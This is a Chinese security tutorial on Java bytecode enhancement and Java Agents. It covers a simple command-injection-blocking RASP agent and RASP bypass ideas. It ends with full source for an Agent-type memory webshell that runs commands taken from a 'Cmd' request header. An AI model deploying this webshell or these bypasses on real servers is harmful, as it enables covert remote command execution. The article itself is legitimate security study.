# 浅析JavaAgent技术及其应用-先知社区

> **来源**: https://xz.aliyun.com/news/17025  
> **文章ID**: 17025

---

# **1、字节码及增强技术**

## 1.1、什么是字节码

Java诞生之初，曾提出过一个广为人知的口号：“**Write Once, Run Anywhere.**” 为了实现这一目标，Sun公司以及其他虚拟机厂商开发了许多能够在不同平台上工作的JVM虚拟机，可以用于加载并执行一种与平台无关的字节码（.class文件）。

通过这种机制，源代码**无需**针对每种平台翻译成对应的机器码，而是被编译成统一的字节码文件，再交由运行在各个平台上的JVM解释和执行，从而实现跨平台运行的能力。

如今，JVM的用途已超越了Java语言本身，催生了许多基于JVM的编程语言，例如Groovy、Scala、Kotlin等，进一步丰富了JVM生态系统。

![Snipaste_2024-12-20_15-32-14.png](images/35a5a466-719d-3d8f-874a-606e50176ec4)

字节码之所以得名，是因为它的文件内容由十六进制值构成，而JVM以两个十六进制值为一组，即以字节为单位进行读取。在Java中，通常使用 `javac` 命令将源代码编译为字节码文件。一个 `.java` 文件从编译到运行的过程可以概括如下：

1. **源代码编写**：开发者编写 `.java` 文件，包含程序的逻辑。
2. **编译阶段**：通过 `javac` 命令编译 `.java` 文件，生成对应的 `.class` 字节码文件。
3. **运行阶段**：使用 `java` 命令，JVM加载并解析 `.class` 文件，将其转换为机器可以理解的指令，然后在目标平台上执行。

![image.png](images/ea49ceb0-837c-3945-a505-03ae608531eb)

整个流程体现了Java跨平台的特点，JVM作为中间层，屏蔽了不同硬件和操作系统之间的差异。

当一个 **.java** 文件通过 **javac** 编译后，会生成一个 **.class** 文件。例如，编写一个简单的 **Main** 类，经过编译后会生成名为 **Main.class** 的文件。打开该文件后，可以看到一系列以十六进制形式表示的数据。这些数据是按照字节为单位进行分割的。

![image1.png](images/2a1b8e7b-163c-39df-bd86-2d5cf8378077)

根据 JVM 规范，每一个字节码文件都必须由十个部分组成，并且这些部分需要按照固定的顺序排列。这个结构确保了 **.class** 文件的统一性和可解析性。

![image2.png](images/507d838f-251e-3fa0-809b-71a8a9909fa8)

## 1.2、字节码增强技术

字节码增强技术是一种通过修改已有的字节码文件或动态生成全新的字节码文件来实现功能扩展的技术。这种技术允许开发者在不直接修改原始源代码的情况下，对程序的行为进行调整或增强。下面我们将介绍几种常见的字节码增强技术

### 1.2.1、**Javassist**

**Javassist** 是一个功能强大的类库，用于在**源代码层次**操作和处理 Java 字节码。它允许开发者对已经编译好的类进行动态修改，例如添加新方法、修改现有方法，甚至动态生成类。值得注意的是，使用 Javassist 不需要深入了解字节码结构或虚拟机指令，开发者可以通过类似反射的方式轻松实现对类结构的动态操作。

在 Javassist 中，以下四个核心类至关重要：ClassPool、CtClass、CtMethod、CtField

1. **CtClass** 它是**对字节码文件在代码中的抽象表示**，包含了类的编译时信息如结构等。它是 Javassist 操作类的核心对象。 通过类的全限定名，可以获取到对应的 `CtClass` 对象。进而可以修改类的定义，例如添加方法、字段或接口，甚至动态生成一个全新的类。 **常用方法**：

* `addMethod(CtMethod method)`：向类中添加一个新方法。
* `addField(CtField field)`：向类中添加一个新字段。
* `writeFile(String directory)`：将修改后的类写入文件。

2. **ClassPool** **用于存储和检索**`CtClass`**对象的容器。**`ClassPool` 可以理解为一个存储 `CtClass` 信息的哈希表，其中键是类的全限定名，值是对应的 `CtClass` 对象 `ClassPool` 是 Javassist 的核心，它负责管理所有的类信息。通过它可以加载、创建或修改类。 **常用方法**：

* `ClassPool.getDefault()`：获取默认的类池对象。
* `ClassPool.get("className")`：加载指定名称的类，返回一个 `CtClass` 对象。

3. **CtMethod**   
   **一个方法的抽象表示**，可以用来**修改现有方法**或**添加新方法**。开发者可以通过它动态调整方法的行为或定义新方法的具体实现。 常用`CtClass.getDeclaredMethod(MethodName)`可以获取对应的CtMethod对象 该类提供了一些方法以便我们能够直接修改方法体。

```
public final class CtMethod extends CtBehavior {
    // 主要的操作方法都在父类 CtBehavior 中
}

------------------------------------------------------------------------

// 父类 CtBehavior
public abstract class CtBehavior extends CtMember {
    // 设置方法体的具体内容
    public void setBody(String src);

    // 插入在方法体最前面
    public void insertBefore(String src);

    // 插入在方法体最后面
    public void insertAfter(String src);

    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);

}
```

​

在使用 Javassist 进行字节码操作时，尤其是在使用 **CtMethod.insertBefore()**, **insertAfter()**, 和 **insertAt()** 等方法插入代码时，可以利用特殊的标识符来访问方法的上下文信息或者改变方法的行为。这些标识符以 **$** 开头，它们在 Javassist 的内部编译器中有特殊的含义，并且非常利于动态注入代码。

|  |  |
| --- | --- |
| **$0** | 这代表的是方法所在的对象实例（即 this 关键字）。在静态方法中，$0 是 null。 |
| **$1, $2, ..., $n** | 这些标识符代表方法的第一、第二到第 n 个参数。例如，在一个有两个参数的方法中，$1 和 $2 分别代表第一和第二个参数。 |
| **$args** | 这是一个表示所有方法参数的 Object[] 数组。例如，如果一个方法有三个参数，$args 数组将包含三个元素，每个元素分别对应一个参数。 |
| **$r** | 在 insertBefore() 或 insertAt() 中用来表示方法的返回类型。它用于创建一个指定类型的新变量。例如，如果方法返回 int，$r 就可以用来声明一个新的 int 变量。 |
| **$w** | 当方法参数是基本数据类型时，用 $w 可以将其包装成相应的包装类。例如，如果一个方法参数是 int，使用 $w($1) 会得到一个 Integer 对象。 |
| **$\_** | $\_ 代表方法的返回值。可以通过修改 $\_ 来改变返回值。 |
| **$sig** | 这是一个 Class[] 数组，其中包含了方法的参数类型。这对于反射操作非常有用。 |
| **$type** | 这是一个 Class 对象，代表方法的返回类型。 |
| **$class** | 这代表方法所在的类的 Class 对象 |

4. **CtField**   
   **表示类中的一个字段**，可以用来新增或修改字段信息。 通过 `CtField`，可以动态向类中添加新的成员变量。

* **常用操作**：

* `new CtField(classPool.get("java.lang.String"), "name", ctClass);`：在\*\*`ctClass`\*\*对应的类中创建一个新的String类型name字段。
* `ctField.setModifiers(int modifiers)`：设置字段的修饰符，例如 `public`、`private` 等。

​

​

* **使用案例**

这里我们使用**Javassist**对class文件进行修改

编译后的`Demo`类的字节码文件如下

![image3.png](images/04472af4-7b0a-3145-9741-6cd68b3d25a8)

定义一个JavassistTest

```
package com.example.test;

import javassist.*;
import java.io.IOException;

public class JavassistTest {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IllegalAccessException, InstantiationException, IOException {
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.get("com.example.test.Demo");

        CtField ctField1 = new CtField(cp.get("java.lang.String"), "a", cc);
        //设置属性访问符为private
        ctField1.setModifiers(Modifier.PRIVATE);
        //将 a 属性添加进 Demo 中，并设置初始值为 test
        cc.addField(ctField1, CtField.Initializer.constant("test"));

        CtMethod m = cc.getDeclaredMethod("hello");
        m.insertBefore("{ System.out.println("start"); }");
        m.insertAfter("{ System.out.println("end"); }");
        
        Class c = cc.toClass();
        cc.writeFile("your_path");
        //执行修改后的Demo类hello方法
        Demo h = (Demo)c.newInstance();
        h.hello();
    }
}
```

JavassistTest编译运行后，会从JVM的ClassPool中获取Demo类的字节码内容。使用**Javassist**可以修改字节码文件

运行JavassistTest 后，Demo.class文件被修改，并且执行hello方法的输出添加了start和end

![4.png](images/01b75545-7810-337c-90c3-ad50479da546)

### 1.2.2、**ASM**

ASM 是一个字节码操作和分析框架，它提供了对字节码的直接操作能力。但是由于ASM 提供了对字节码细节的深入控制，所以ASM 的使用较为复杂，需要深入理解 Java 字节码的结构和指令集。直接操作字节码也意味着开发者必须编写更多的代码来处理具体的字节码指令。

Javassist 允许开发者使用接近 Java 源代码的表达方式，通过简单的 API 调用实现复杂的字节码操作，减少了代码量和复杂性，大大提高了易用性。但因为Javassist 使用过程中需要将Java源代码抽象转换为具体的字节码指令等操作，相对于 ASM会可能引入更多的性能开销。

**使用案例**

这里我们使用**ASM**修改一个class文件

首先我们的Main 类中定义了ClassReader和ClassWriter，ClassReader读取字节码文件，使得**ClassWriter**初始化时可以直接复制原始字节码中类的结构，然后交给CustomClassVisitor类处理，处理完成后由ClassWriter写字节码并将旧的字节码替换掉。

```
public class Main {
    public static void main(String[] args) throws Exception {
        InputStream in = new FileInputStream("your_path/DemoAsm.class");
        ClassReader cr = new ClassReader(in);
        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);
        ClassVisitor cv = new CustomClassVisitor(Opcodes.ASM9, cw);
        cr.accept(cv, ClassReader.SKIP_DEBUG);
        byte[] b = cw.toByteArray();
        FileOutputStream fos = new FileOutputStream("your_path/DemoAsm.class");
        fos.write(b);
        fos.close();
    }
}
```

定义CustomClassVisitor 继承自ClassVisitor，重写visitMethod方法，该方法会判断字节码读到哪一个方法，当读到hello()方法时，调用CustomMethodVisitor处理

```
public class CustomClassVisitor extends ClassVisitor {
    public CustomClassVisitor(int api, ClassVisitor classVisitor) {
        super(api, classVisitor);
    }

    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
        if (!name.equals("<init>") && mv != null && "hello".equals(name)) {
            // 对 hello 方法应用自定义 CustomMethodVisitor
            return new CustomMethodVisitor(api, mv);
        }
        return mv;
    }
}
```

类CustomMethodVisitor 中的visitCode方法，它会在ASM开始访问某一个方法的Code区时被调用，因此重写visitCode方法，在方法开始时插入 System.out.println("start"); 的字节码

```
public class CustomMethodVisitor extends MethodVisitor {
    public CustomMethodVisitor(int api, MethodVisitor methodVisitor) {
        super(api, methodVisitor);
    }

    @Override
    public void visitCode() {
        super.visitCode();
        // 插入 System.out.println("start"); 的字节码
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("start");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
    }
}
```

原始字节码

![5.png](images/feede5e7-db3c-3346-9f69-c657063c7a2b)

使用ASM修改后

![6.png](images/7d54289f-f3bd-3bd8-a46c-9c448419c660)

### 1.2.3、遗留问题

在一个JVM实例中，如果先实例化一个类，然后对其进行字节码增强并重新加载，会导致什么情况发生呢？模拟这种情况，只需在之前提到的Javassist的`JavassistTest`类中的`main()`方法中的第一行加入`Demo d = new Demo();`，即在增强处理之前就让JVM加载了`Demo`类。这时运行就会发现`cc.toClass()`报错了。

![7.png](images/5e00398b-3259-3d89-87fa-25e186f38c0c)

因为在JVM中，动态重新加载一个类在运行时是不被允许的。如果只能在类加载之前对类进行增强，那么字节码增强技术的应用场景将受到限制。 但是，利用**Java Agent**技术就可以绕过限制，实现在一个已经加载了所有类且持续运行的JVM中，仍然可以利用字节码增强技术来替换并重新加载其中类的操作。

​

# 2、**Java Agent**

## 2.1、**什么是 Java Agent？**

Java Agent是一个jar包，但它不能独立运行，而是需要附加到目标JVM进程中。

Java Agent也被称为Java探针，这个称呼相当形象。一旦JVM开始运行，对外部来说，它就像一个黑盒一样。然而，Java Agent就像一支针一样，可以插入到JVM内部，探索其中的内容，并且可以对其进行修改。像一些调试器、线上排查工具、热部署功能等常见场景都是使用了Java Agent技术

## 2.2、**Java Agent的实现及使用**

一个Java Agent主要包含两个部分，一是实现代码，一是配置文件。

* 实现代码：入口类需要实现`agentmain` 和 `premain` 方法，在两个方法中实现具体的功能操作，如读取线程状态、监控数据和修改类的字节码等。
* 配置文件：文件名为 MANIFEST.MF，放在 META-INF 目录下，主要包括配置项：`Manifest-Version`: 版本号 ；`Premain-Class`: premain 方法所在类；`Agent-Class`: agentmain 方法所在类 ；`Can-Redefine-Classes`: 是否可以实现类的重定义； `Can-Retransform-Classes`: 是否可以实现字节码替换

Java Agent可以在应用程序运行之前或之后加载。在应用程序的main方法运行之前，会首先调用Java Agent jar包中的`premain`方法。而在应用程序运行之后即JVM启动后，加载Java Agent jar包时会执行`agentmain`方法。

### 2.2.1 premain

Java Agent一种启动方式，是通过应用程序的JVM启动参数`-javaagent:xxx.jar`的形式与JVM一起启动，这种情况下，会调用`premain`方法。

我们先定义一个入口类`AgentTest`，实现`agentmain` 和 `premain` 方法

`agentArgs` 是传递给Agent的参数字符串，如`-javaagent:xxx.jar agentArgs`；

`inst` 是一个 `Instrumentation` 接口实例，允许Agent与 JVM 进行交互，允许开发者在JVM运行时检查和修改应用程序类。

![image 8.png](images/6365a7db-ba86-3a52-87b9-3a90b82c78ff)

并且在pom.xml中配置好指定参数的值

```
<build>
  <plugins>
    <!-- Maven Shade Plugin，用于打包Uber JAR并设置Manifest属性 -->
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-shade-plugin</artifactId>
      <version>3.2.4</version>
      <executions>
        <execution>
          <phase>package</phase>
          <goals>
            <goal>shade</goal>
          </goals>
          <configuration>
            <createDependencyReducedPom>false</createDependencyReducedPom>
            <transformers>
              <!-- 设置Manifest属性，指定Agent入口类 -->
              <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
                <mainClass>com.example.test.agent.AgentTest</mainClass>
                <manifestEntries>
                  <Premain-Class>com.example.test.agent.AgentTest</Premain-Class>
                  <Agent-Class>com.example.test.agent.AgentTest</Agent-Class>
                  <Can-Redefine-Classes>true</Can-Redefine-Classes>
                  <Can-Retransform-Classes>true</Can-Retransform-Classes>
                </manifestEntries>
              </transformer>
            </transformers>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```

在AgentTest的根目录下运行mvn clean package，将其打包

![image 9.png](images/39fb08f9-a2d4-3cf7-9570-bd484bc03429)

在 IDEA 中配置应用程序启动时的JVM的运行参数，在 **VM options** 中添加 -javaagent:/path/to/Agent\_test-1.0-SNAPSHOT.jar   
![image 10.png](images/f3399180-6196-35ed-a90f-e84ece0d9191)

运行项目后发现在JVM启动前已经调用了premain方法

![image 11.png](images/737579c5-2f62-3e70-b4d7-9d1a66225cdb)

### 2.2.2 agentmain

与\*\*`premain`**不同，**`agentmain`**方法是为了之后可以在JVM运行时动态地加载代理而设计的，它可以在JVM启动后的任何时间通过Attach API加载Agent。这样的特性使得**`agentmain`\*\*非常适合于不需要重启JVM的情况下，动态地插入监控、调试或修改运行中的应用程序。例如，动态调试、运行时检测和热补丁应用。下面我们来看一下关键的几个类

## 2.3、动态修改字节码

前面提到了在\*\*`agentmain`\*\*方法中有个参数`Instrumentation inst`是用于获取`Instrumentation`实例的，该类允许开发者在JVM运行时检查和修改应用程序类。

JVM提供了`instrument`这个类库，用于支持Java语言编写的插桩服务，可以修改已加载的类。

在JDK 1.6之前，`instrument`只在JVM启动时加载类时生效；但在JDK 1.6及以后版本，`instrument`支持在运行时修改类定义。

为了利用`instrument`的类修改功能，我们需要实现`ClassFileTransformer`接口，并创建一个类文件转换器。在这个接口中，`transform()`方法会在加载类文件时被调用，允许我们使用ASM或Javassist等技术来改写或替换传入的字节码。

![image 12.png](images/5b9cbaf9-b7a1-3bd4-a92c-646f02d6514b)

可以看到我们的对transform()功能是项目应用中的TestAgent类的hello方法的输出添加了start和end

接着我们定义agent入口类AgentTest，将Transformer添加到Instrumentation实例中，并借助agentmain在后续执行

![image 13.png](images/92b01f60-dcc3-3421-a290-22332b32300c)

将agent文件打包成jar包后，我们需要另一个工具将我们的agent动态加载到正在运行的JVM上

## **2.4、JVMTI**

JVM TI（JVM TOOL INTERFACE，JVM工具接口）是JVM提供的一套工具接口，用于操作JVM。通过JVMTI，可以实现对JVM的多种操作，它允许注册各种事件勾子，在JVM事件发生时触发这些勾子，从而对不同的JVM事件做出响应。Java Agent可以被看作是JVMTI的一种实现方式。

当Agent需要动态加载到正在运行的JVM上时，就需要借助Attach API 进行实现

这里我们定义一个`Attach_test`类，利用Attach API获取机器上所有正在运行的JVM列表，当找到指定的JVM的时候就加载我们已经打包好的Agent.jar

![image 14.png](images/3aae3e3a-e89e-3864-bc37-5fde182fdb2f)

我们正在运行的spring项目中的TestAgent类的hello()方法，及调用的/api/hello接口如下

![image 15.png](images/54c731d3-ccc0-3b51-96ea-bf80e18890e8)

​

![image 16.png](images/06061e62-9d29-3e40-bd56-b6b01c7f9522)

运行Spring项目后，运行我们的Attach\_test类将Agent\_test.jar注入到spring项目中，显示注入成功

![image 17.png](images/7ce7bedc-1f3b-38c2-9e1f-9f6514f93b87)

重新访问/api/hello接口，发现打印的内容已经新增了start和end

![image 18.png](images/64d21626-280f-3aa7-8f33-8d7fab65e77b)

# 3、JavaAgent安全上的应用

## 3.1、RASP

运行时应用自我保护（Runtime Application Self-Protection，简称 RASP）是一种通过 Java Agent 技术实现的安全机制。它能够在应用运行期间动态修改类的字节码，将防护逻辑注入到 Java 的底层 API 和 Web 应用程序内部，使安全功能与应用深度集成。通过实时分析和拦截攻击行为，RASP 为应用程序提供了自我保护的能力，帮助其在运行时主动抵御各种 Web 威胁。

结合上面的例子我们实现一个简易的具有针对命令注入漏洞检测和拦截的RASP，其中利用基于Java Agent实现的Hook机制，RASP可以对Java类方法执行前后插入自定义逻辑。

Windows和Linux操作系统的命令执行方法调用过程如下

![image 19.png](images/ad212ff1-28ec-3ab3-b072-10bf35cdaac2)

RASP一般会选择**java.lang.ProcessImpl**和**java.lang.UNIXProcess的<init>或start**方法，我们这里选择**java.lang.ProcessImpl**的start方法作为Hook点

首先，定义一个自定义注解 **@HookAnnotation**。这个注解可以作为标记，表示哪些类或方法需要被RASP Agent处理。

```
/**
 * 自定义标记注解，用于RASP Agent检测
 */
@Retention(RetentionPolicy.RUNTIME)
public @interface HookAnnotation {
    String value() default "";
}
```

​

接着定义一个针对命令执行方法的Hook类CmdExecHook ，当检测到执行命令时参数有特殊字符串就检测并拦截，这里也可以使用常见的各种攻击命令作为list合集进行检测

```
/**
 * 针对命令执行方法的钩子，用于检测命令注入漏洞
 */
@HookAnnotation
public class CmdExecHook implements ClassFileTransformer {
    private final ClassPool classPool;
    private final Instrumentation instrumentation;

    public CmdExecHook(Instrumentation inst) {
        this.instrumentation = inst;
        this.classPool = new ClassPool(true);
        try {
            // 获取引导类加载器的类路径
            String bootClassPath = System.getProperty("sun.boot.class.path");
            if (bootClassPath != null) {
                String[] paths = bootClassPath.split(File.pathSeparator);
                for (String path : paths) {
                    if (path == null || path.trim().isEmpty()) continue;
                    try {
                        // 检查文件是否存在
                        java.io.File file = new java.io.File(path);
                        if (file.exists()) {
                            this.classPool.insertClassPath(path);
                        } 
                    } catch (NotFoundException e) {
                        System.err.println("[CmdExecHook] 添加类路径时出错: " + path);
                        e.printStackTrace();
                    }
                }
                System.out.println("[CmdExecHook] 已完成引导类路径的添加");
            } else {
                System.err.println("[CmdExecHook] 无法获取引导类路径 (sun.boot.class.path)");
            }

            // 添加系统类路径
            this.classPool.appendSystemPath();
            System.out.println("[CmdExecHook] 已添加系统类路径到 ClassPool");
        } catch (Exception e) {
            System.err.println("[CmdExecHook] 初始化 ClassPool 时出错");
            e.printStackTrace();
        }
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className == null) {
            return null;
        }

        try {

            CtClass ctClass = this.classPool.makeClass(new ByteArrayInputStream(classfileBuffer));
            if (ctClass.isInterface() || ctClass.isAnnotation() || ctClass.isEnum()) {
                ctClass.detach();
                return null;
            }
            boolean modified = false;

            // 钩取 java/lang/ProcessImpl 类
            if ("java/lang/ProcessImpl".equals(className)) {
                modified = this.transformProcessImplClass(ctClass);
            }

            if (modified) {
                byte[] byteCode = ctClass.toBytecode();
                ctClass.detach(); // 释放 CtClass 资源
                System.out.println("[CmdExecHook] 已修改类: " + className);
                return byteCode;
            }
            ctClass.detach();
        } catch (IOException | CannotCompileException e) {
            System.err.println("[CmdExecHook] 处理类 " + className + " 时出错");
            e.printStackTrace();
        }

        return null; // 不修改其他类
    }

    /**
     * 转换java/lang/ProcessImpl类，注入监控代码
     *
     * @param ctClass CtClass实例
     * @throws CannotCompileException 编译异常
     */
    private boolean transformProcessImplClass(CtClass ctClass) throws CannotCompileException {
        // 监控 start() 方法
        boolean modified = false;
        for (CtMethod method : ctClass.getDeclaredMethods()) {
            if ("start".equals(method.getName())) {
                wrapStartMethod(method);
                System.out.println("[CmdExecHook] 已钩取 ProcessImpl.start() 方法");
                modified = true;
            }
        }
        return modified;
    }

    /**
     * 在Runtime.exec(String cmd)方法中插入监控代码
     *
     * @param method CtMethod实例
     * @throws CannotCompileException 编译异常
     */
    private void wrapStartMethod(CtMethod method) throws CannotCompileException {
        StringBuilder srcBuilder = new StringBuilder();
        srcBuilder.append("    String regex = "[<>`;$|&]";
");
        srcBuilder.append("    String[] cmdarray = (String[])$1;
");
        srcBuilder.append("    if (cmdarray != null) {
");
        srcBuilder.append("    for (int i = 0; i < cmdarray.length; i++) {
");
        srcBuilder.append("        String cmd = cmdarray[i];
");
        srcBuilder.append("        if (cmd != null) {
");
        srcBuilder.append("            if (cmd.matches(".*" + regex + ".*")) {
");
        srcBuilder.append("                System.err.println("[RASP WARNING] 检测到命令注入行为，命令: " + cmd);
");
        srcBuilder.append("                Thread.dumpStack();
");
        srcBuilder.append("                throw new RuntimeException("检测到命令注入操作，已被阻止。");
");
        srcBuilder.append("            }
");
        srcBuilder.append("        }
");
        srcBuilder.append("    }
");
        srcBuilder.append("    }
");
//        System.out.println(srcBuilder.toString());
        method.insertBefore(srcBuilder.toString());
    }

}
```

最后定义一个RASP Agent的主类，负责初始化和注册ClassFileTransformer

```
public class RASPAgent {

    /**
     * 在应用启动时通过 -javaagent 参数调用
     *
     * @param agentArgs       Agent参数
     * @param instrumentation Instrumentation实例
     */
    public static void premain(String agentArgs, Instrumentation instrumentation) {
        System.out.println("[RASPAgent] 初始化 via premain...");
        setup(instrumentation);
    }

    /**
     * 在应用运行时通过Attach API动态附加Agent时调用
     *
     * @param agentArgs       Agent参数
     * @param instrumentation Instrumentation实例
     */
    public static void agentmain(String agentArgs, Instrumentation instrumentation) {
        System.out.println("[RASPAgent] 初始化 via agentmain...");
        setup(instrumentation);
    }

    /**
     * 设置Agent，注册ClassFileTransformer
     *
     * @param instrumentation Instrumentation实例
     */
    private static void setup(Instrumentation instrumentation) {
        try {
            // 获取Agent JAR的位置
            CodeSource codeSource = RASPAgent.class.getProtectionDomain().getCodeSource();
            if (codeSource != null) {
                File agentJarFile = new File(codeSource.getLocation().toURI());
                if (agentJarFile.exists()) {
                    // 将Agent JAR添加到引导类加载器的搜索路径
                    instrumentation.appendToBootstrapClassLoaderSearch(new java.util.jar.JarFile(agentJarFile));
                    System.out.println("[RASPAgent] 已将Agent JAR添加到引导类加载器的搜索路径");
                } else {
                    System.err.println("[RASPAgent] Agent JAR 文件不存在: " + agentJarFile.getAbsolutePath());
                }
            } else {
                System.err.println("[RASPAgent] 无法获取Agent JAR的路径");
            }
        } catch (IOException | URISyntaxException e) {
            System.err.println("[RASPAgent] 添加 Agent JAR 到引导类加载器时出错");
            e.printStackTrace();
        }

        // 注册CmdExecHook
        CmdExecHook cmdExecHook = new CmdExecHook(instrumentation);
        instrumentation.addTransformer(cmdExecHook, true);

        System.out.println("[RASPAgent] Transformer已注册");

        String[] classNames = {
                "java.lang.ProcessImpl",
                // 需要重新转换的类...
        };
        for (String className : classNames) {
            try {
                // 重新转换已经加载的类（如 java.lang.ProcessImpl）
                Class<?> clazz = Class.forName(className, true, ClassLoader.getSystemClassLoader());
                if (instrumentation.isModifiableClass(clazz)) {
                    instrumentation.retransformClasses(clazz);
                    System.out.println("[RASPAgent] 已重新转换类: " + className);
                } else {
                    System.err.println("[RASPAgent] 类不可修改: " + className);
                }


            } catch (Exception e) {
                System.err.println("[RASPAgent] 重新转换类时报错: " + className);
                e.printStackTrace();
            }
        }
    }
}
```

这里有一个坑点，由于 **Java Agent** 默认情况下无法拦截和修改 **引导类加载器（Bootstrap ClassLoader）** 加载的类，如`java.lang.ProcessImpl`、`java.io.FileInputStream`等标准的 JDK 类，由引导类加载器加载。Java Agent 需要特别配置才能拦截和修改这些类。  
所以要解决这个问题，需要确保以下几点：

* **允许 Transformer 拦截引导类加载器中的类**：

* 在 `CmdExecHook` 的构造方法中，确保 `ClassPool` 包含引导类路径。
* 使用 `Instrumentation` 对象添加 Transformer，并指定可以重新转换已加载的类。

* **在 Agent 启动时指定引导类路径**：

* 您需要在 agent 的 `premain` 方法中将引导类路径添加到 `Instrumentation` 中，以便能够修改引导类加载器加载的类。

* **重新转换已经加载的类**：

* 如果 `java.lang.ProcessImpl` 已经在 agent 启动之前被加载，您需要显式地重新转换该类。

因此，在上面的 `CmdExecHook` 和`RASPAgent`中，都分别实现了引导类路径的添加、重新转换已加载类等操作，从而可以拦截和修改 **引导类加载器** 加载的类。

将`RASPAgent`打包成jar包后，在主项目运行时加上`-javaagent:"rasp-agent-1.0.0.jar"`，项目运行后显示`RASP`相关的hook加载成功

![image 20.png](images/c2debc6b-176f-3a5e-9f43-b6dfb8490c45)

此时发送命令注入行为的恶意请求包，RASP拦截成功

![image 21.png](images/1217f25c-6e28-35c7-af7c-4d6b5532b9af)

上面只是实现了一个较为简单的RASP检测和拦截命令注入行为。针对RASP目前有一些常见的绕过思路，主要分为两类：

1、使用没有被限制的类或者函数来绕过（类似绕过黑名单），因此尽量覆盖所有的

贴一张常见的实现类图（来自其他师傅总结）  
![image-20201202201757182.png](images/95af9e10-c776-30aa-819d-d1b792ea1a12)

2、

* 利用更底层的技术进行绕过，如直接hook java底层操作实现的c代码(Java\_java\_lang\_Processlmpl\_create等)，但是难度较大
* 使用Java本地接口书写程序(Java Native Interface，JNI)绕过 RASP（如，通过修改编译so和dll文件）
* 线程的堆栈绕过

​

## 3.2、JavaAgent内存马

Java内存马类型主要有四种：Filter型、Servlet型、Listener型以及Agent型

JDK1.5以后，JavaAgent能够在不影响正常编译的情况下，修改字节码。因此将恶意代码放到项目中的**某个一定会执行**的方法内。

Spring boot 中内嵌了一个`embed Tomcat`作为容器，目前常规Filter型内存马中主要是通过\*\*重写/添加`Filter`\*\*来实现的。因此我们也可以在`Filter`上利用实现Agent型内存马

我们可以查看Spring启动后的调用链

![image 22.png](images/62d6c75e-91bd-33f2-bd16-4332713ee653)

我们查看被反复调用的ApplicationFilterChain#doFilter() 方法

![image 23.png](images/fcf2c48b-e18c-3c09-a767-908cc0dc2220)

跟进org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法

![image 24.png](images/40a46924-e677-3f74-bc5d-03d42d13f2b8)

我们可以发现以上两个方法均拥有 **ServletRequest** 和 **ServletResponse**，并且并hook 不会影响正常的业务，因此我们在此处进行恶意代码插入

首先，我们定义入口主类Agent\_Memshell 及agentmain方法，因为内存马需要在项目运行后动态注入，因此需要agentmain方法的执行特性

```
public class Agent_Memshell {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String agentArgs, Instrumentation inst) {
        System.out.println("调用agentmain方法成功！");
        Class [] classes = inst.getAllLoadedClasses();
        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals(ClassName)){
                try {
                    ClassPool classPool = ClassPool.getDefault();
                    ClassClassPath classClassPath = new ClassClassPath(cls);
                    classPool.insertClassPath(classClassPath);
                    //添加一个transformer到Instrumentation，并重新触发目标类加载
                    inst.addTransformer(new TransformerTest(),true);
                    inst.retransformClasses(cls);
                    System.out.println("Agent Load Done.");
                } catch (Exception e) {
                    System.out.println("Agent load failed!");
                    e.printStackTrace(); 
                }
            }
        }
    }
}
```

接着定义一个实现ClassFileTransformer接口的TransformerTest类，其中对org.apache.catalina.core.ApplicationFilterChain#doFilter方法执行初期，插入恶意代码，如果请求包中含有Cmd请求头，就对该值进行命令执行

```
public class TransformerTest implements ClassFileTransformer {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/",".");
        if (className.equals(ClassName)){
            System.out.println("Find the Inject Class: " + ClassName);
            ClassPool cp = ClassPool.getDefault();
            try {
                CtClass cc = cp.get(ClassName);
                if (cc.isFrozen()) {
                    cc.defrost();
                }
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;
" +
                        "String cmd = httpServletRequest.getHeader("Cmd");
" +
                        "if (cmd != null){
" +
                        "    Process process = Runtime.getRuntime().exec(cmd);
" +
                        "    java.io.InputStream input = process.getInputStream();
" +
                        "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));
" +
                        "    StringBuilder sb = new StringBuilder();
" +
                        "    String line = null;
" +
                        "    while ((line = br.readLine()) != null){
" +
                        "        sb.append(line + "\
");
" +
                        "    }
" +
                        "    br.close();
" +
                        "    input.close();
" +
                        "    response.getOutputStream().print(sb.toString());
" +
                        "    response.getOutputStream().flush();
" +
                        "    response.getOutputStream().close();
" +
                        "}");
                byte[] bytes = cc.toBytecode();
                cc.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```

这里有几个可能会碰到的问题

1、注入Agent内存马后，可能会出现`class is Frozen`的报错 因为，一旦一个CtClass对象通过writeFile（）、toClass（）或者toByteCode（）方法转换为class文件，**javassist会对该CtClass对象进行冻结**，阻止进一步的修改操作。这种设计旨在警示开发者避免对已被JVM加载的class文件进行修改，因为JVM不支持重新加载已加载的类。 所以我们可以加入下面代码进行解冻

```
if (ctClass.isFrozen()) {
		ctClass.defrost();
}
```

2、注入Agent内存马后，可能会出现`javassist no found such xxxxx class`的报错

因为可能是Javassist并没有将JVM中某些类文件加载进去

